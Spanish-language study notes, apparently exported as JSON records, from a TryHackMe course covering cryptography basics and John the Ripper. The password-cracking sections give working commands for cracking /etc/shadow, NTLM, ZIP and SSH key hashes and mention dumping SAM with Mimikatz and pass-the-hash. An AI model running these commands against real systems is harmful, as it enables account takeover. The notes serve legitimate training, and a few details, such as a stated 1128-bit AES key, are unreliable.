    "content": "Hay dos categor√≠as principales de encriptado:\n\n- Sim√©trica.\n- Asim√©trica.\n\n-----------\n<h2>Encriptaci√≥n Sim√©trica</h2>\nEsta usa la misma llave para encriptar y desencriptar informaci√≥n. Mantener la llave secreta es un deber. Tambi√©n es llamada criptograf√≠a de clave privada. Comunicar la clave a las partes implicadas puede ser retante ya que necesita un canal de comunicaci√≥n seguro. Mantener el secreto de la clave puede ser dif√≠cil, especialmente si hay varios receptores.\n\n![[129.jpg]]\n\nEjemplos de encriptaci√≥n sim√©trica son DES (Data Encryption Standard), 3DES (Triple DES) y AES (Advanced Encryption Standard).\n\n- **DES:** Adoptado como est√°ndar en 1977 usa una llave de 56 bits. Con los avances tecnol√≥gicos, esta llave fue vulnerada en menos de 24 horas en 1999, transicionando a 3DES.\n- **3DES:** Es aplicar DES tres veces, aumentando el tama√±o de la clave hasta 168 bits. Fue deprecada en 2019 y debe ser cambiada por AES.\n- **AES:** Fue adoptada como est√°ndar en 2001. La clave puede ser de 1128, 192 o 256 bits.\n\n-------------\n<h2>Encriptaci√≥n Asim√©trica</h2>\nAl contrario que la encriptaci√≥n sim√©trica, la encriptaci√≥n asim√©trica usa claves diferentes para encriptar y desencriptar. Esta usa la llave p√∫blica para encriptar y la privada s√≥lo para desencriptar. Se conoce tambi√©n como criptograf√≠a de clave p√∫blica.\n\n![[130.jpg]]\n\nAlgunos ejemplos son RSA, Diffie-Hellman y ECC (Eliptic Curve Cryptography). La clave privada necesita ser secreta.\n\nLa criptograf√≠a asim√©trica tiende a ser m√°s lenta y usan claves m√°s largas que los m√©todos de criptograf√≠a sim√©trica. RSA usa llaves de 2048, 3072 y 4096 bits.\n\nLa criptograf√≠a asim√©trica se basa en una seria de problemas matem√°ticos f√°ciles de computar en una direcci√≥n pero extremadamente dif√≠ciles de hacerlo a la inversa.\n\n----------------\n<h2>Resumen y nuevos t√©rminos</h2>\n- **Alice y Bob:** Son dos personajes com√∫nmente usados en ejemplos de criptograf√≠a.\n- **Encriptaci√≥n Sim√©trica:** M√©todo en el que se usa la misma clave para encriptar y desencriptar.\n- **Encriptaci√≥n Asim√©trica:** M√©todo en el que se usan diferentes claves para encriptar y desencriptar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Basic Math",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/6-basic-math/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/6. Basic Math.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "Los fundamentos de la criptograf√≠a moderna recaen sobre las matem√°ticas. Para demostrar algunos algoritmos b√°sicos cubriremos dos operaciones matem√°ticas usadas en varios algoritmos:\n\n- Operaci√≥n XOR.\n- Operaci√≥n M√≥dulo.\n\n----------------\n<h2>Operaci√≥n XOR</h2>\nXOR es la operaci√≥n `or` eXclusivamente. Tiene la siguiente tabla de resultados:\n\n| A   | B   | A ‚äï B |\n| --- | --- | ----- |\n| 0   | 0   | 0     |\n| 0   | 1   | 1     |\n| 1   | 0   | 1     |\n| 1   | 1   | 0     |\nSe representa mediante el s√≠mbolo ‚äï o ^. Compara los dos bits y devuelve 1 s√≥lo si son diferentes y 0 en el resto de casos.\n\nAl hacer XOR con los n√∫meros 1010 y 1100 el resultado ser√°: 0110.\n\nPara poner un ejemplo real:\n\n- C: Texto cifrado.\n- P: Texto plano.\n- K: Llave.\n\nSabemos que *C = P ‚äï K*. Si sabemos P y K, podemos recuperar C. Comenzamos con  *C ‚äï K = (P ‚äï K) ‚äï K*. Tambi√©n sabemos que *(P ‚äï K) ‚äï K = P ‚äï (K ‚äï K)* porque XOR es asociativa, y que *K ‚äï K = 0*. Consecuentemente, *(P ‚äï K) ‚äï K = P ‚äï (K ‚äï K) = P ‚äï 0 = P*.\n\n\n--------------\n<h2>Operaci√≥n M√≥dulo</h2>\nOtra operaci√≥n usada mucho en criptograf√≠a es la de m√≥dulo, com√∫nmente escrita como `%` o `mod`. Esta operaci√≥n rescata el resto de una divisi√≥n.\n\n- `25%5 = 0`: Porque 25/5 = 5 con resto 0.\n- `23%6 = 5`: Porque 3 * 6 =18 y 23 -18 = 5.\n- `23%7 = 2`: Porque 7 * 3 = 21 y 23 - 21 = 2.\n\nAlgo importante que notar sobre el m√≥dulo es que no es reversible. hay infinitos valores para x en `x%5 = 4`. La operaci√≥n siempre devuelve un n√∫mero entero (int) positivo entre `0` y `n - 1` en `a%n`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Cryptography Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/0-cryptography-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/0. Cryptography Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/1. Introduction]]\n[[2. Importance of Cryptography]]\n[[3. Plaintext to Ciphertext]]\n[[4. Historical Ciphers]]\n[[5. Types of Encryption]]\n[[6. Basic Math]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Importance of Cryptography",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/2-importance-of-cryptography/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/2. Importance of Cryptography.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "El prop√≥sito final de la criptograf√≠a es asegurar la comunicaci√≥n en presencia de adversarios. El t√©rmino seguro incluye la confidencialidad e integridad de la informaci√≥n intercambiada. La criptograf√≠a es la pr√°ctica y el estudio de las t√©cnicas que permiten la comunicaci√≥n segura.\n\nLa criptograf√≠a es usada para mantener la confidencialidad, integridad y autenticidad de los datos. En esta √©poca se usa la criptograf√≠a a diario.\n\n- Cuando inicias sesi√≥n en TryHackMe.\n- Cuando te conectas a una m√°quina por SSH.\n- Cuando usas el banco online.\n- Cuando te descargas un archivo.\n\nRara vez tenemos que interactuar directamente con la criptograf√≠a, pero sus implicaciones nos llegan a todos de una manera u otra. \n\nUna compa√±√≠a que quiera usar tarjetas de cr√©dito, necesita agarrarse al est√°ndar PCI DSS (Payment Card Industry Data Security Standard). Esta informaci√≥n debe ser encriptada al usarse (obviamente) pero tambi√©n al almacenarse. As√≠ mismo, una empresa que utilice registros m√©dicos debe atenerse a los est√°ndares propios. Al contrario que el de los datos bancarios, estos cambian entre pa√≠ses.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Custom Rules",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/8-custom-rules/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/8. Custom Rules.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "<h2>¬øQu√© son las Reglas Personalizadas?</h2>\nPuedes definir tus propias reglas de mangling por las que John se guiar√° para crear contrase√±as que probar. Son √∫tiles cuando tienes informaci√≥n sobre tu objetivo.\n\n------------------\n<h2>Reglas Personalizadas Comunes</h2>\nMuchas organizaciones requieren un cierto nivel de complejidad de contrase√±as para tratar de combatir ataques de diccionario. Es por esto que si intentas algo como `polopassword` no funcionar√° y te dar√° un mensaje pidi√©ndote, probablemente:\n\n- Una min√∫scula.\n- Una may√∫scula.\n- Un n√∫mero.\n- Un s√≠mbolo.\n\nLa complejidad de contrase√±as es buena, sin embargo, podemos aprovecharnos de que la mayor√≠a de usuarios ser√° predecible en la colocaci√≥n de estos caracteres. Para la contrase√±a de antes, la mayor√≠a de los usuarios elegir√° algo del siguiente estilo: `Polopassword1!`.\n\nEsto cumple los requisitos de complejidad de contrase√±as, pero como atacantes conocedores de estad√≠sticas podemos usar estos conocimientos a nuestro favor para crear reglas y diccionarios.\n\n------------------\n<h2>¬øC√≥mo crear Reglas Personalizadas?</h2>\nLas reglas personalizadas se definen en el archivo `john.conf`. Este puede ser encontrado en `/opt/john/john.conf`.\n\nMiremos la sintaxis de estas reglas. Ten en cuenta que puedes definir una cantidad masiva de niveles de control en estas. Para ver todas las posibilidades puedes consultar la [documentaci√≥n](https://www.openwall.com/john/doc/RULES.shtml). \n\nLa primera l√≠nea:\n\n`[List.Rules:THMRules]`: Se usa para definir el nombre de la regla. Esto es lo que usar√°s para llamar a tu regla en el argumento de John.\n\nUsamos regex para decir d√≥nde cambian las palabras:\n\n- `Az`: Coge la palabra y la pone al final de caracteres que definamos.\n- `A0`: Coge la palabra y la pone al principio de caracteres que definamos.\n- `c`: Capitaliza el car√°cter en funci√≥n de la posici√≥n.\n\nEstos pueden ser combinados para especificar lo que queremos modificar.\n\nPor √∫ltimo, debemos definir qu√© caracteres deber√≠an ser a√±adidos. Hacemos esto a√±adiendo sets de caracteres entre corchetes `[ ]` donde deber√≠an ser puestos seguido por comillas `\" \"` como modificadores. Algunos ejemplos:\n\n- `[0-9]`: Incluir√° n√∫meros del 0 al 9.\n- `[0]`: Incluir√° s√≥lo el n√∫mero 0.\n- `[A-z]`: Incluir√° may√∫sculas y min√∫sculas.\n- `[A-Z]`: Incluir√° s√≥lo may√∫sculas.\n- `[a-z]`: Incluir√° s√≥lo min√∫sculas.\n\nTen en cuenta que:\n\n- `[a]`: S√≥lo incluir√° la \"a\".\n- `[!@#$%&]`: Incluir√° los s√≠mbolos !, @, #, $, % y &.\n\nPara poner todo esto en pr√°ctica y crear contrase√±as del estilo de `Polopassword1!`, har√≠amos algo as√≠:\n\n`[List.Rules:PoloPassword]`\n`cAz\"[0-9] [!@#$%&]\"\n\n- `c`: Capitaliza la primera letra.\n- `Az`: A√±ade al final de la palabra:\n\t- `[0-9]`: Un n√∫mero del 0 al 9.\n\t- `[!@#$%&]`: Uno de estos caracteres.\n\n-------------\n<h2>Usar Reglas Personalizadas</h2>\nPodr√≠amos llamar a esta regla usando el argumento `--rule=PoloPassword`.\n\nComo comando completo: `john --wordlist=[ruta al diccionario] --rule=PoloPassword [ruta al archivo]`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Cracking letclshadow Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/6-cracking-letclshadow-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/6. Cracking letclshadow Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "El archivo `/etc/shadow` es el archivo de Linux donde se almacenan las contrase√±as hasheadas. Tambi√©n guarda otra informaci√≥n, como la fecha del √∫ltimo cambio de contrase√±a o informaci√≥n sobre la expiraci√≥n de esta. S√≥lo el usuario root puede acceder a este archivo.\n\n--------------\n<h2>Unshadoweando</h2>\nJohn puede ser muy especialito sobre los formatos e informaci√≥n que necesita para crackear un hash. Por esta raz√≥n, para crackear las contrase√±as de `/etc/shadow` necesitas combinarlo con el archivo `/etc/passwd`. Para hacer esto usamos una herramienta que se llama `unshadow`. La sintaxis b√°sica de `unshadow` es la siguiente:\n\n`unshadow [ruta a passwd] [ruta a shadow]`\n\n- `unshadow`: Llama a la herramienta `unshadow`.\n- `[ruta a passwd]`: Especifica el archivo que contiene passwd.\n- `[ruta a shadow]`: Especifica el archivo que contiene shadow.\n\nPor ejemplo:\n\n`unshadow local_passwd local_shadow > unshadowed.txt`\n\n>[!NOTE] Al usar los archivos passwd y shadow, podemos usar los archivos enteros o s√≥lo las l√≠neas relevantes.\n\n-----------\n<h2>Crackeando</h2>\nPodemos despu√©s darle el resultado de `unshadow` a `john`. No necesitar√≠amos especificar un modo, pues hemos hecho el input espec√≠ficamente para `john`. Sin embargo, en algunos casos, necesitaremos especificar el formato como hac√≠amos antes.\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Cracking Windows Authentification Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/5-cracking-windows-authentification-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/5. Cracking Windows Authentification Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Ahora que entendemos la sintaxis b√°sica y su uso, vamos a ver c√≥mo crackear algo un poco m√°s complicado. Algo que quiz√°s incluso tengas que hacer en un entorno de penetraci√≥n Red Team. Los hashes de autentificaci√≥n son versiones hasheadas de las contrase√±as guardadas por los sistemas operativos. Es posible crackearlos con fuerza bruta, a veces. Por lo general, para tener acceso a estos ya debemos ser un usuario con privilegios.\n\n--------------\n<h2>NTHash / NTLM</h2>\nNTHash es el formato de hash moderno que las m√°quinas Windows usan para guardar sus contrase√±as (de usuarios y servicios). Tambi√©n se le llama com√∫nmente NTLM, que hace referencia a la versi√≥n previa de este formato, LM, as√≠ que NT LM.\n\nUn poco de historia: la designacion NT de Windows originalmente significaba \"New Technology\", para denotar a los productos no construidos para el SO MS-DOS. Con el tiempo el significado se diluy√≥ hacia el nombre del sistema operativo.\n\nEn Windows, SAM (Security Account Manager) es usado para almacenar informaci√≥n de la cuenta del usuario. Se pueden adquirir los NTHash dumpeando la base de datos de SAM de una m√°quina Windows usando una herramienta como `Mimikatz` o usando la base de datos de Active Directory: `NTDS.dit`. Puede incluso que no tengas que romper el hash para conseguir una escalada de privilegios pues podr√≠as llegar a ejecutar un ataque \"pass the hash\".",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Basic Terms",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/2-basic-terms/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/2. Basic Terms.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "<h2>¬øQu√© son los Hashes?</h2>\nUn hash es una manera de tomar una pieza de informaci√≥n de cualquier longitud y transformarla en otra de longitud fija. Este proceso oculta el valor original. El valor resultante se obtiene de pasar la informaci√≥n original por un algoritmo hasheador.\n\n-----------\n<h2>¬øQu√© los hace seguros?</h2>\nLas funciones hasheadoras est√°n dise√±adas para funcionar s√≥lo en una direcci√≥n. Este problema computacional tiene sus or√≠genes en el problema matem√°tico [P vs NP](https://www.youtube.com/watch?v=UR2oDYZ-Sao).\n\nEn ciencia computacional, P y NP son dos clases de problemas que nos ayudan a entender la eficiencia de los algoritmos:\n\n- **P (Polynomial Time):** La clase P cubre los problemas cuya soluci√≥n puede ser encontrada en tiempo polin√≥mico. Considera ordenar una lista en orden ascendente. Cuanto m√°s larga sea la lista, mayor ser√° el tiempo. Sin embargo, el incremento en tiempo no es exponencial.\n- **NP (Non-deterministic Polynomial Time):** Los problemas de esta clase son aquellos cuyos dada una soluci√≥n, pueden ser comprobados r√°pidamente, aunque encontrar la respuesta en s√≠ pueda ser dif√≠cil.\n\nAunque este problema y su complejidad real quedan muy fuera del alcance de esta lecci√≥n, podemos extrapolar que hashear la informaci√≥n ser√≠a **P** mientras que des-hashearla ser√≠a **NP**.\n\n-------------\n<h2>¬øD√≥nde entra en juego John?</h2>\nAunque el algoritmo no es reversible, eso no significa que crackear los hashes sea imposible. Si tienes la versi√≥n hasheada de una contrase√±a, y sabes qu√© algoritmo se utiliza, puedes usar un algoritmo para hashear una gran cantidad de pseudocontrase√±as para obtener un diccionario.\n\nEste proceso se conoce como ataque de diccionario y John the Ripper es una herramienta que ejecuta estos ataques de fuerza bruta en muchos tipos de hashes.\n\nEn esta unidad nos centraremos en la versi√≥n m√°s extendida de John the Ripper, **Jumbo John**.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "John the Ripper es una herramienta de crackeo de hashes y conocida y amada. Combina una r√°pida velocidad de crackeo con un amplio rango de hashes compatibles.\n\n-----------\n<h2>Pre-requisitos</h2>\nPara obtener el m√°ximo beneficio se recomienda no comenzar esta unidad sin antes haber completado las tres predecesoras:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n--------------\n<h2>Objetivos de Aprendizaje</h2>\nAl completar esta unidad, habr√°s aprendido sobre el uso de John para:\n\n- Crackear hashes de autentificaci√≥n de Windows.\n- Crackear hashes de `/etc/shadow`.\n- Crackear archivos ZIP protegidos por contrase√±a.\n- Crackear archivos RAR protegidos por contrase√±a.\n- Crackear claves SSH.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Single Crack Mode",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/7-single-crack-mode/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/7. Single Crack Mode.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Hasta el momento, hemos usado los diccionarios en `john` para realizar ataques de fuerza bruta. Pero John tambi√©n tiene otro modo, llamado **Single Crack**. En este modo, John usa s√≥lo la informaci√≥n dada del nombre de usuario y prueba posibles contrase√±as usando heur√≠stica cambiando letras y n√∫meros contenidos en dicho nombre.\n\n-------------\n<h2>Modificaci√≥n de Palabras</h2>\nLa mejor manera de explicar el modo Single Crack y word mangling (modificaci√≥n de palabras) es a trav√©s de un ejemplo:\n\nConsidera el nombre de usuario \"Markus\". Algunas posibles contrase√±as ser√≠an:\n\n- Markus1, Markus2, Markus3, etc.\n- MArkus, MARkus, MASRKus, etc.\n- Markus!, Markus$, Markus*, etc.\n\nEsta t√©cnica se conoce como **word mangling**. John construye su propio diccionario bas√°ndose en la informaci√≥n que le ha sido dada y usando un conjunto de reglas (mangling rules), que definen c√≥mo se muta la palabra inicial.\n\n-------------\n<h2>GECOS</h2>\nLa implementaci√≥n de John del word mangling tambi√©n ofrece compatibilidad con el campo GECOS de los sistemas operativos UNIX. GECOS significa General Electric Comprehensive Operating System. En la √∫ltima tarea hemos visto entradas para `shadow` y `passwd`. Si miramos de cerca veremos que los campos est√°n separados por \":\". El quinto campo en el registro de la cuenta de usuario es el campo GECOS. Almacena informaci√≥n general sobre el usuario, como el nombre completo, n√∫mero de oficina y n√∫mero de tel√©fono entre otros. John puede tomar informaci√≥n guardada en esos registros como el nombre completo y el nombre del directorio home para a√±adirlo a su diccionario al crackear `/etc/shadow` con el modo single crack.\n\n----------------------------\n<h2>Usando el modo Single Crack</h2>\nPara usar el modo single crack, usamos casi la misma sintaxis que hemos usado hasta ahora, por ejemplo, si queremos crackear la contrase√±a de un usuario llamado \"Mike\", usando el modo single crack, escribir√≠amos:\n\n`john --single --format=[formato] [ruta al archivo]`\n\n- `--single`: Indica que queremos usar el modo single crack.\n- `--format=[formato]`: Es como siempre, aqu√≠ indicamos el formato.\n\nEjemplo de uso:\n\n`john --single --format=raw-sha256 hashes.txt`\n\n>[!NOTE] Si estamos crackeando hashes en modo single crack, necesitamos cambiar el formato del archivo que le damos a John para que entienda con qu√© informaci√≥n crear el diccionario. Hacemos esto a√±adiendo el nombre de usuario, es decir pasamos de `1efee03cdcb96d90ad48ccc7b8666033` -> `mike:1efee03cdcb96d90ad48ccc7b8666033`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. Cracking SSH Keys with John",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/11-cracking-ssh-keys-with-john/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/11. Cracking SSH Keys with John.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Exploremos otro de los usos de John: crackear la contrase√±a de los archivos de claves SSH privadas como `id_rsa`.\n\n-----------------\n<h2>SSH2John</h2>\n¬øQui√©n podr√≠a haberlo imaginado? Otra herramienta de conversi√≥n. La herramienta `ssh2john` convierte la clave privada `id_rsa` que se usa para iniciar sesi√≥n por SSH en formato hash con el que John puede trabajar. Si no tienes `ssh2john` instalado, puedes usar `/opt/john/ssh2john.py`. La sintaxis es:\n\n`ssh2john [archivo id_rsa] > [archivo de salida]`\n\n- `ssh2john`: Invoca a la herramienta.\n- `[archivo id_rsa]`: Ruta al archivo id_rsa.\n- `>`: Redirecci√≥n.\n- `[archivo de salida]`: Donde se guardar√° el hash.\n\nPor ejemplo:\n\n`/opt/john/ssh2john.py id_rsa > id_rsa_hash.txt`\n\n-----------------\n<h2>Crackeo</h2>\nLe vamos a pasar el hash que hemos obtenido a John tal cual, como ya venimos haciendo. Un ejemplo de sintaxis es:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hashh.txt`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Cracking Password-Protected Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/9-cracking-password-protected-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/9. Cracking Password-Protected Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "S√≠, lo has le√≠do bien, podemos usar John para crackear las contrase√±as de los archivos zip protegidos por contrase√±a. Usaremos herramientas separadas de la suite de John para convertir los archivos `zip` a algo que John pueda entender.\n\n--------------------\n<h2>Zip2John</h2>\nSimilar a la herramienta `unshadow`, usaremos `zip2john` para convertir el archivo `zip` a un formato de hash que John pueda entender y con suerte crackear. El uso primario es:\n\n`zip2john [opciones] [archivo zip] > [archivo de salida]`\n\n- `[opciones]`: Permite pasarle opciones espec√≠ficas a `zip2john`, aunque no deber√≠a de ser necesario.\n- `[archivo zip]`: La ruta al archivo zip que queremos crackear.\n- `>`: Redirecci√≥n, crea un nuevo documento si no existe y lo sobreescribe si s√≠.\n- `[archivo de salida]`: Archivo en el que se guardar√° la salida del comando.\n\nPor ejemplo:\n\n`zip2john zipfile.zip > zip_hash.txt`\n\n-----------------\n<h2>Crackeo</h2>\nUna vez tenemos el hash, podemos d√°rselo directamente a John, como hicimos con `unshadow`.\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. John the Ripper - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/0-john-the-ripper-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/0. John the Ripper - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/1. Introduction]]\n[[2. Basic Terms]]\n[[3. Setting Up Your system]]\n[[4. Cracking Basic Hashes]]\n[[5. Cracking Windows Authentification Hashes]]\n[[6. Cracking letclshadow Hashes]]\n[[7. Single Crack Mode]]\n[[8. Custom Rules]]\n[[9. Cracking Password-Protected Files]]\n[[10. Cracking Password-Protected RAR Archives]]\n[[11. Cracking SSH Keys with John]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Cracking Basic Hashes",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/4-cracking-basic-hashes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/4. Cracking Basic Hashes.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
    "content": "Hay muchas maneras de usar John the Ripper para crackear hashes simples. Veremos unas cuantas antes de ponernos a crackear nosotros mismos.\n\n------------------\n<h2>Sintaxis B√°sica de John</h2>\nLa sintaxis b√°sica de John the Ripper es la siguiente:\n\n`john [opciones] [ruta de archivo]`\n\n- `john`: Para llamar a la herramienta John the Ripper.\n- `[opciones]`: Especifica las opciones que queremos usar.\n- `[ruta al archivo]`: El archivo que contiene el hash que queremos crackear.\n\n-----------------\n<h2>Crackeo Autom√°tico</h2>\nJohn tiene propiedades internas que detectan el tipo de hash que tiene delante para aplicar las reglas necesarias. Aunque esta no siempre es la mejor idea porque puede no ser preciso. Para usarlo hacemos: `john --wordlist=[ruta a diccionario] [ruta al archivo]`.\n\n- `--wordlist=`: Indica que vamos a proporcionar un diccionario.\n- `[ruta a diccionario]`: La ruta al diccionario que vamos a usar.\n\nPor ejemplo:\n\n`john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`.\n\n----------------\n<h2>Identificar el Hash</h2>\nA veces John no lo hace bien con el reconocimiento autom√°tico del hash, pero podemos usar otras herramientas para identificar el formato. Hay varias maneras de hacerlo, como usando un identificador de hash online como [este](https://hashes.com/en/tools/hash_identifier). Tambi√©n hay herramientas de consola como [esta](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master), llamada hash-identifier, hecha con Python.\n\nPara obtenerla puedes usar `wget` o `curl`, para descargarte el `.py` de la p√°gina web.\n\n```bash\nuser@TryHackMe$ wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py $ python3 hash-id.py    #########################################################################    #     __  __                     __           ______    _____           #    #    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #    #    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #    #     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #    #      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #    #       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #    #        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #    #                                                             By Zion3R #    #                                                    www.Blackploit.com #    #                                                   Root@Blackploit.com #    ######################################################################### \n--------------------------------------------------  HASH: 2e728dd31fb5949bc39cac5a9f066498  Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n```\n\n----------------\n<h2>Crackeo de Formatos Espec√≠ficos</h2>\nUna vez que hemos identificado el formato del hash, podemos decirle a John de qu√© tipo de hash se trata:\n\n`john --format=[formato] --wordlist=[ruta a diccionario] [ruta al archivo]`\n\n- `--format=`: Especifica que vamos a introducir el tipo de hash.\n- `[format]`: El formato del hash.\n\nPor ejemplo:\n\n`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashToCrack.txt`\n\n>[!NOTE] Cuando le decimos a John el formato, si este es est√°ndar, debemos precederlo de un \"raw-\". Para asegurarnos de si tenemos que poner el \"raw-\" o no podemos consultarlo con `john --list=formats | grep -iF \"md5\"`, por ejemplo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Setting Up Your system",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/4-john-the-ripper-the-basics/3-setting-up-your-system/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/4. John the Ripper - The Basics/3. Setting Up Your system.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 4. John the Ripper - The Basics",
